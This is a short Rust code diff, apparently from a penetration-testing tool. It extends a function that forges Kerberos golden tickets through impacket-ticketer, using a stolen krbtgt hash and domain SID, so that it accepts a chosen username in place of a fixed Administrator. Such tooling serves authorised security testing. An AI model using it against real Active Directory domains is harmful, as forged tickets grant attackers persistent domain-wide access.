@@ -65,12 +65,13 @@ pub async fn s4u_attack(args: &Value) -> Result<ToolOutput> {
 /// Generate a Kerberos golden ticket using impacket-ticketer.
 ///
 /// Required args: `krbtgt_hash`, `domain_sid`, `domain`
-/// Optional args: `extra_sid`
+/// Optional args: `extra_sid`, `username`
 pub async fn generate_golden_ticket(args: &Value) -> Result<ToolOutput> {
     let krbtgt_hash = required_str(args, "krbtgt_hash")?;
     let domain_sid = required_str(args, "domain_sid")?;
     let domain = required_str(args, "domain")?;
     let extra_sid = optional_str(args, "extra_sid");
+    let username = optional_str(args, "username").unwrap_or("Administrator");
 
     CommandBuilder::new("impacket-ticketer")
         .flag("-nthash", krbtgt_hash)
@@ -78,7 +79,7 @@ pub async fn generate_golden_ticket(args: &Value) -> Result<ToolOutput> {
         .flag("-domain", domain)
         .flag_opt("-extra-sid", extra_sid)
         .flag("-user-id", "500")
-        .arg("Administrator")
+        .arg(username)
         .timeout_secs(120)
         .execute()
         .await
